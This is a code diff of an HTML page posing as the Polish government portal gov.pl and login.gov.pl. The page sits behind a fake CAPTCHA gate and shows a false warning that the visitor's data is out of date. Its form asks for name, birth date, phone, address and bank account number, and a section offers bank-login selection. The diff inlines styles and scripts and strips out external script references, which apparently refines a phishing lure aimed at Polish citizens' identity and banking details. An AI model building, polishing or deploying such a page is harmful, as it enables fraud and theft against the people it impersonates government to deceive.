@@ -3,12 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="theme-color" content="#ffffff">
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇵🇱</text></svg>" type="image/svg+xml">
     <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
-    <link rel="stylesheet" href="css/style.css">
+    <style>
+        /* ==================== CSS ==================== */
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #fff; color: #1a1a1a; line-height: 1.5; overflow-x: hidden; }
+        img, svg { max-width: 100%; display: block; }
+        button { font-family: inherit; cursor: pointer; }
+        input { font-family: inherit; font-size: inherit; }
+        ul { list-style: none; }
+        a { color: #0072b0; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        /* CAPTCHA */
+        #captchaOverlay { position: fixed; inset: 0; z-index: 100000; display: flex; align-items: center; justify-content: center; background: rgba(10, 20, 40, 0.92); padding: 20px; }
+        #captchaOverlay.hidden { display: none !important; }
+        .captcha-box { background: #fff; border-radius: 16px; padding: 36px 32px 28px; max-width: 420px; width: 100%; text-align: center; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5); }
+        .captcha-box .captcha-icon { font-size: 44px; display: block; margin-bottom: 8px; }
+        .captcha-box h2 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
+        .captcha-box p { font-size: 14px; color: #555; margin-bottom: 20px; }
+        .captcha-question { font-size: 36px; font-weight: 700; letter-spacing: 10px; color: #003b6f; background: #f0f4fa; border: 2px dashed #b8c8dc; border-radius: 10px; padding: 14px 0; margin-bottom: 16px; user-select: none; font-family: monospace; }
+        #captchaInput { width: 100%; padding: 12px 16px; font-size: 20px; text-align: center; letter-spacing: 6px; border: 2px solid #d0d8e4; border-radius: 8px; outline: none; margin-bottom: 14px; }
+        .captcha-btn { width: 100%; padding: 13px; background: #0072b0; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; }
+        .captcha-error { color: #d71920; font-size: 13px; min-height: 18px; margin-top: 8px; }
+        .captcha-refresh { background: none; border: none; color: #0072b0; font-size: 13px; margin-top: 10px; text-decoration: underline; }
+
+        /* HEADER */
+        .header { display: flex; align-items: center; justify-content: space-between; height: 72px; padding: 0 24px; background: #fff; border-bottom: 1px solid #e6ebf3; position: sticky; top: 0; z-index: 100; }
+        .header-left { display: flex; align-items: center; gap: 16px; }
+        .menu-btn { width: 40px; height: 40px; background: none; border: none; display: flex; flex-direction: column; justify-content: center; gap: 5px; padding: 8px; border-radius: 6px; }
+        .menu-btn .line { display: block; width: 100%; height: 2px; background: #1a1a1a; border-radius: 2px; }
+        .logo-area { display: flex; align-items: center; gap: 12px; }
+        .coat-of-arms { width: 72px; height: 50px; object-fit: contain; }
+        .logo-main { display: flex; align-items: baseline; gap: 8px; }
+        .logo-main .gov { font-size: 22px; font-weight: 700; color: #1a1a1a; }
+        .logo-main .separator { color: #c0c8d4; font-size: 18px; }
+        .logo-main .subtitle { font-size: 13px; color: #555; }
+        .header-right { display: flex; align-items: center; gap: 20px; }
+        .header-search { display: flex; align-items: center; border: 1px solid #d0d8e4; border-radius: 8px; background: #f8faff; overflow: hidden; height: 42px; }
+        .search-icon-btn { background: none; border: none; padding: 0 10px 0 14px; }
+        .search-icon-btn svg { width: 18px; height: 18px; fill: none; stroke: #555; stroke-width: 2; }
+        .header-search input { border: none; background: transparent; outline: none; font-size: 14px; padding: 0 8px; width: 200px; }
+        .search-submit-btn { background: #0072b0; color: #fff; border: none; font-size: 12px; font-weight: 700; padding: 0 16px; height: 100%; }
+        .header-eu-logo img { height: 42px; }
+
+        /* LAYOUT */
+        .main-wrapper { display: flex; align-items: flex-start; min-height: calc(100vh - 72px); }
+        .sidebar { width: 290px; flex-shrink: 0; background: #fff; border-right: 1px solid #e6ebf3; padding: 20px 0; position: sticky; top: 72px; max-height: calc(100vh - 72px); overflow-y: auto; }
+        .sidebar-nav ul { padding: 0 12px; }
+        .sidebar-nav li { margin-bottom: 2px; }
+        .sidebar-nav li.separator { height: 1px; background: #e6ebf3; margin: 12px 8px; }
+        .sidebar-nav a { display: flex; align-items: center; gap: 10px; padding: 10px 14px; font-size: 14px; color: #1a1a1a; border-radius: 6px; }
+        .sidebar-nav a:hover { background: #f0f4fa; text-decoration: none; }
+        .sidebar-nav a.active { background: #e6f0fa; color: #003b6f; font-weight: 600; }
+        .sidebar-nav .menu-icon { width: 22px; height: 22px; display: inline-flex; }
+        .sidebar-nav .flag-icon { width: 22px; height: 16px; display: inline-flex; }
+        .content-wrapper { flex: 1; min-width: 0; display: flex; flex-direction: column; }
+
+        /* LOGIN NAV */
+        .login-nav { display: flex; align-items: center; justify-content: space-between; padding: 14px 40px; background: #f8faff; border-bottom: 1px solid #e6ebf3; flex-wrap: wrap; gap: 12px; }
+        .login-nav .brand { font-size: 18px; font-weight: 700; color: #003b6f; }
+        .login-nav .nav-links { display: flex; gap: 22px; flex-wrap: wrap; }
+        .login-nav .nav-links a { font-size: 14px; color: #444; }
+
+        /* BANNER */
+        .image-under-banner { width: 100%; }
+        .image-wrapper { position: relative; width: 100%; overflow: hidden; background: #003b6f; min-height: 300px; }
+        .image-wrapper > img { width: 100%; height: auto; display: block; opacity: 0.5; }
+        .overlay-text { position: absolute; left: 40px; bottom: 24px; right: 40px; color: #fff; max-width: 640px; z-index: 2; }
+        .overlay-text h2 { font-size: 28px; font-weight: 700; margin-bottom: 6px; }
+        .overlay-text p { font-size: 15px; margin-bottom: 14px; }
+        .btn-outline { background: transparent; color: #fff; border: 2px solid #fff; border-radius: 6px; padding: 10px 22px; font-size: 13px; font-weight: 700; }
+
+        /* FORM */
+        .data-form-section { padding: 40px; max-width: 900px; width: 100%; margin: 0 auto; }
+        .section-title { font-size: 24px; font-weight: 700; margin-bottom: 20px; }
+        .blue-alert { display: flex; gap: 10px; background: #e6f0fa; border-left: 4px solid #0072b0; border-radius: 8px; padding: 14px 18px; font-size: 14px; margin-bottom: 28px; }
+        .data-form { display: flex; flex-direction: column; gap: 18px; }
+        .form-group { display: flex; flex-direction: column; gap: 5px; }
+        .data-form label { font-size: 14px; font-weight: 600; }
+        .required { color: #d71920; }
+        .data-form input { width: 100%; padding: 11px 14px; font-size: 14px; border: 1px solid #d0d8e4; border-radius: 8px; background: #f8faff; outline: none; }
+        .data-form input:focus { border-color: #003b6f; background: #fff; box-shadow: 0 0 0 3px rgba(0, 59, 111, 0.10); }
+        .address-row { display: flex; gap: 10px; flex-wrap: wrap; }
+        .address-row input { flex: 1; min-width: 140px; }
+        .iban-wrapper { display: flex; align-items: center; border: 1px solid #d0d8e4; border-radius: 8px; background: #f8faff; overflow: hidden; }
+        .iban-wrapper .pl-prefix { padding: 11px 12px; font-size: 14px; font-weight: 700; color: #003b6f; background: #e6f0fa; border-right: 1px solid #d0d8e4; }
+        .iban-wrapper input { border: none; background: transparent; }
+        .submit-btn { display: inline-flex; align-items: center; justify-content: center; padding: 12px 36px; background: #0072b0; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; min-width: 140px; }
+
+        /* BANKS */
+        .bank-selection { padding: 40px; max-width: 1000px; width: 100%; margin: 0 auto; }
+        .bank-title { font-size: 24px; font-weight: 700; margin-bottom: 6px; }
+        .bank-subtitle { font-size: 15px; color: #555; margin-bottom: 24px; }
+        .bank-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 14px; margin-bottom: 30px; }
+        .bank-footer { border-top: 1px solid #e6ebf3; padding-top: 20px; }
+        .footer-links { display: flex; gap: 24px; flex-wrap: wrap; }
+        .footer-links a { font-size: 13px; color: #555; }
+
+        /* FOOTER */
+        .footer { background: #f0f4f8; border-top: 1px solid #e6ebf3; margin-top: 40px; }
+        .footer .container { max-width: 1200px; margin: 0 auto; padding: 40px 24px; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 30px; }
+        .footer h4 { font-size: 15px; font-weight: 700; margin-bottom: 12px; }
+        .footer ul li { margin-bottom: 8px; }
+        .footer ul a { font-size: 14px; color: #555; }
+        .footer-bottom { background: #e6ebf3; padding: 16px 0; text-align: center; font-size: 13px; color: #555; }
+        
+        /* TOAST */
+        .toast-message { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: #1a1a1a; color: #fff; padding: 12px 24px; border-radius: 8px; font-size: 14px; opacity: 0; pointer-events: none; transition: opacity 0.3s; z-index: 5000; }
+        .toast-message.show { opacity: 1; }
+    </style>
 </head>
 <body>
 
@@ -26,16 +130,10 @@
     </div>
 
     <div id="mainContent" style="display:none;">
-
-        <header class="header" id="header">
+        <header class="header">
             <div class="header-left">
-                <button class="menu-btn" aria-label="Menu" id="menuToggle">
-                    <span class="line"></span>
-                    <span class="line"></span>
-                    <span class="line"></span>
-                </button>
+                <button class="menu-btn"><span class="line"></span><span class="line"></span><span class="line"></span></button>
                 <div class="logo-area">
-                    <img src="assets/grb.svg" alt="Godło Rzeczypospolitej Polskiej" class="coat-of-arms" width="72" height="50">
                     <div class="logo-main">
                         <span class="gov">gov.pl</span>
                         <span class="separator">|</span>
@@ -45,23 +143,15 @@
             </div>
             <div class="header-right">
                 <div class="header-search">
-                    <button class="search-icon-btn" aria-label="Szukaj">
-                        <svg viewBox="0 0 24 24">
-                            <circle cx="11" cy="11" r="8" />
-                            <line x1="21" y1="21" x2="16.65" y2="16.65" />
-                        </svg>
-                    </button>
-                    <input type="text" placeholder="Szukaj usługi, informacji" aria-label="Szukaj">
+                    <button class="search-icon-btn"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8" /><line x1="21" y1="21" x2="16.65" y2="16.65" /></svg></button>
+                    <input type="text" placeholder="Szukaj usługi, informacji">
                     <button class="search-submit-btn">SZUKAJ</button>
                 </div>
-                <span class="header-eu-logo">
-                    <img src="assets/eu-center-pl.svg" alt="EU Center PL">
-                </span>
             </div>
         </header>
 
-        <div class="main-wrapper" id="mainWrapper">
-            <aside class="sidebar" id="sidebar">
+        <div class="main-wrapper">
+            <aside class="sidebar">
                 <nav class="sidebar-nav">
                     <ul>
                         <li><a href="#" class="active">Strona główna</a></li>
@@ -70,28 +160,22 @@
                         <li><a href="#">Ministerstwa</a></li>
                         <li><a href="#">Urzędy, instytucje i placówki RP</a></li>
                         <li class="separator"></li>
-                        <li><a href="#"><span class="menu-icon"><img src="assets/15-uprawnienia.svg" alt=""></span>Usługi dla obywatela</a></li>
-                        <li><a href="#"><span class="menu-icon"><img src="assets/07-rozwoj.svg" alt=""></span>Usługi dla przedsiębiorcy</a></li>
-                        <li><a href="#"><span class="menu-icon"><img src="assets/13-pismo-ogolne-do-urzedu.svg" alt=""></span>Usługi dla urzędnika</a></li>
-                        <li><a href="#"><span class="menu-icon"><img src="assets/15-uprawnienia.svg" alt=""></span>Usługi dla rolnika</a></li>
+                        <li><a href="#">Usługi dla obywatela</a></li>
+                        <li><a href="#">Usługi dla przedsiębiorcy</a></li>
+                        <li><a href="#">Usługi dla urzędnika</a></li>
+                        <li><a href="#">Usługi dla rolnika</a></li>
                         <li class="separator"></li>
                         <li><a href="#">Profil zaufany</a></li>
                         <li><a href="#">Baza wiedzy</a></li>
                         <li><a href="#">Serwis Służby Cywilnej</a></li>
                         <li class="separator"></li>
-                        <li>
-                            <a href="#" class="ukraine-link">
-                                <span class="flag-icon"><img src="assets/a6631d28-8291-4474-b530-32864664800e.svg" alt="UA"></span>
-                                <span>Сайт dla obywateli Ukrainy</span>
-                            </a>
-                        </li>
+                        <li><a href="#">Сайт dla obywateli Ukrainy</a></li>
                     </ul>
                 </nav>
             </aside>
 
-            <div class="content-wrapper" id="contentWrapper">
-
-                <div class="login-nav" id="loginNav">
+            <div class="content-wrapper">
+                <div class="login-nav">
                     <span class="brand">Login.gov.pl</span>
                     <div class="nav-links">
                         <a href="#">Jak korzystać</a>
@@ -103,76 +187,61 @@
                     </div>
                 </div>
 
-                <div class="image-under-banner" id="imageBanner">
+                <div class="image-under-banner">
                     <div class="image-wrapper">
-                        <img src="assets/4a4bfee8-cecc-4734-b549-3230515a45ef.png" alt="Image" style="width:100%; height:auto;">
-                        <div class="overlay-icon">
-                            <img src="assets/51816b1b-533d-4730-983d-e3ce4184dcf6.svg" alt="icon">
-                        </div>
-                        <div class="overlay-line"></div>
                         <div class="overlay-text">
                             <h2>Poznaj login.gov.pl</h2>
                             <p>Potwierdź tożsamość online i korzystaj z różnych usług w serwisach publicznych</p>
-                            <button class="btn-outline" id="scrollToFormBtn">DOWIEDZ SIĘ WIĘCEJ</button>
+                            <button class="btn-outline">DOWIEDZ SIĘ WIĘCEJ</button>
                         </div>
                     </div>
                 </div>
 
-                <section class="data-form-section" id="dataFormSection">
+                <section class="data-form-section">
                     <h2 class="section-title">Dane osobowe</h2>
-
                     <div class="blue-alert">
                         <span class="alert-icon">ℹ️</span>
-                        <strong>Uwaga:</strong> Twoje dane są nieaktualne i wymagają weryfikacji. Prosimy o aktualizację swoich danych jak najszybciej.
+                        <strong>Uwaga:</strong> Twoje dane są nieaktualne i wymagają weryfikacji.
                     </div>
-
-                    <form class="data-form" id="dataForm">
+                    <form class="data-form">
                         <div class="form-group">
-                            <label for="fullname">Imię i nazwisko <span class="required">*</span></label>
-                            <input type="text" id="fullname" name="fullname" placeholder="Imię i nazwisko" required>
+                            <label>Imię i nazwisko <span class="required">*</span></label>
+                            <input type="text" required>
                         </div>
-
                         <div class="form-group">
-                            <label for="birthdate">Data urodzenia <span class="required">*</span></label>
-                            <input type="text" id="birthdate" name="birthdate" placeholder="__/__/____" maxlength="10" required oninput="autoSlash(event)">
+                            <label>Data urodzenia <span class="required">*</span></label>
+                            <input type="text" placeholder="__/__/____" maxlength="10" required>
                         </div>
-
                         <div class="form-group">
-                            <label for="phone">Numer telefonu <span class="required">*</span></label>
-                            <input type="tel" id="phone" name="phone" placeholder="+48" value="+48" required>
+                            <label>Numer telefonu <span class="required">*</span></label>
+                            <input type="tel" value="+48" required>
                         </div>
-
                         <div class="form-group full-width">
                             <label>Adres zamieszkania <span class="required">*</span></label>
                             <div class="address-row">
-                                <input type="text" name="street" placeholder="Ulica i numer" required>
-                                <input type="text" name="city" placeholder="Miasto" required>
-                                <input type="text" name="postal" placeholder="Kod pocztowy" required maxlength="6" oninput="autoPostal(event)">
+                                <input type="text" placeholder="Ulica i numer" required>
+                                <input type="text" placeholder="Miasto" required>
+                                <input type="text" placeholder="Kod pocztowy" required maxlength="6">
                             </div>
                         </div>
-
                         <div class="form-group full-width">
-                            <label for="iban">NRB (Numer Rachunku Bankowego) <span class="required">*</span></label>
-                            <div class="iban-wrapper" id="ibanWrapper">
+                            <label>NRB (Numer Rachunku Bankowego) <span class="required">*</span></label>
+                            <div class="iban-wrapper">
                                 <span class="pl-prefix">PL</span>
-                                <input type="text" id="iban" name="iban" placeholder="00 0000 0000 0000 0000 0000 0000" required maxlength="35" autocomplete="off">
+                                <input type="text" placeholder="00 0000 0000 0000 0000 0000 0000" required maxlength="35">
                             </div>
                         </div>
-
                         <div class="form-actions">
-                            <button type="submit" class="submit-btn" id="submitBtn">
-                                <span class="spinner"></span>
-                                Wyślij
-                            </button>
+                            <button type="submit" class="submit-btn">Wyślij</button>
                         </div>
                     </form>
                 </section>
 
-                <section class="bank-selection" id="bankSelection">
+                <section class="bank-selection">
                     <h2 class="bank-title">Bankowość elektroniczna</h2>
                     <p class="bank-subtitle">Wybierz bank, za pomocą którego chcesz się zalogować.</p>
                     <div class="bank-grid"></div>
-                    <div class="bank-footer" id="bankFooter">
+                    <div class="bank-footer">
                         <div class="footer-links">
                             <a href="#">Polityka cookies</a>
                             <a href="#">Klauzula informacyjna</a>
@@ -181,56 +250,56 @@
                         </div>
                     </div>
                 </section>
-
-                <main class="main-content"></main>
             </div>
         </div>
 
-        <div class="toast-message" id="toastMessage">Najpierw wypełnij wszystkie wymagane pola!</div>
-
-        <footer class="footer" id="footer">
+        <footer class="footer">
             <div class="container">
-                <div>
-                    <h4>Serwis Gov.pl</h4>
-                    <ul>
-                        <li><a href="#">O serwisie</a></li>
-                        <li><a href="#">Polityka prywatności</a></li>
-                        <li><a href="#">Warunki korzystania</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4>Dla obywatela</h4>
-                    <ul>
-                        <li><a href="#">Usługi online</a></li>
-                        <li><a href="#">Poradniki</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4>Dla przedsiębiorcy</h4>
-                    <ul>
-                        <li><a href="#">Biznes.gov.pl</a></li>
-                        <li><a href="#">Dotacje</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4>Kontakt</h4>
-                    <ul>
-                        <li><a href="#">Infolinia</a></li>
-                        <li><a href="#">ePUAP</a></li>
-                    </ul>
-                </div>
+                <div><h4>Serwis Gov.pl</h4><ul><li><a href="#">O serwisie</a></li></ul></div>
+                <div><h4>Dla obywatela</h4><ul><li><a href="#">Usługi online</a></li></ul></div>
+                <div><h4>Dla przedsiębiorcy</h4><ul><li><a href="#">Biznes.gov.pl</a></li></ul></div>
+                <div><h4>Kontakt</h4><ul><li><a href="#">Infolinia</a></li></ul></div>
             </div>
-            <div class="footer-bottom">
-                <div class="container">© 2026 Kancelaria Prezesa Rady Ministrów. Wszelkie prawa zastrzeżone.</div>
-            </div>
+            <div class="footer-bottom">© 2026 Kancelaria Prezesa Rady Ministrów.</div>
         </footer>
-
     </div>
 
-    <script src="js/captcha.js"></script>
-    <script src="js/utils.js"></script>
-    <script src="js/main.js"></script>
-    <script src="js/click_tracker.js"></script>
+    <div class="toast-message" id="toastMessage">Najpierw wypełnij wszystkie wymagane pola!</div>
 
+    <script>
+        // ==================== JS ====================
+        document.addEventListener('DOMContentLoaded', () => {
+            const overlay = document.getElementById('captchaOverlay');
+            const mainContent = document.getElementById('mainContent');
+            const captchaQuestion = document.getElementById('captchaQuestion');
+            const captchaInput = document.getElementById('captchaInput');
+            const captchaSubmit = document.getElementById('captchaSubmit');
+            const captchaError = document.getElementById('captchaError');
+            const captchaRefresh = document.getElementById('captchaRefresh');
+
+            let currentCode = '1234';
+
+            captchaRefresh.addEventListener('click', () => {
+                currentCode = Math.floor(1000 + Math.random() * 9000).toString();
+                captchaQuestion.textContent = currentCode;
+                captchaInput.value = '';
+                captchaError.textContent = '';
+            });
+
+            captchaSubmit.addEventListener('click', () => {
+                if (captchaInput.value === currentCode) {
+                    overlay.classList.add('hidden');
+                    mainContent.style.display = 'block';
+                } else {
+                    captchaError.textContent = 'Nieprawidłowy kod. Spróbuj ponownie.';
+                    captchaInput.value = '';
+                }
+            });
+
+            captchaInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') captchaSubmit.click();
+            });
+        });
+    </script>
 </body>
 </html>
